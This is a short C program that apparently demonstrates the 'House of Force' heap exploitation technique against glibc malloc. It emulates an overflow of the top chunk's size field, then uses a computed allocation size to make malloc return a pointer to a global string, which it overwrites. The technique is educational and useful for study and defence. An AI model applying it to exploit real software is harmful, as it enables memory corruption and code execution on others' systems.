#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	
	fprintf(stderr, "\nWe will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);

	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);
	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
	
	/* we set the new size of the top chunck*/	
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);
}
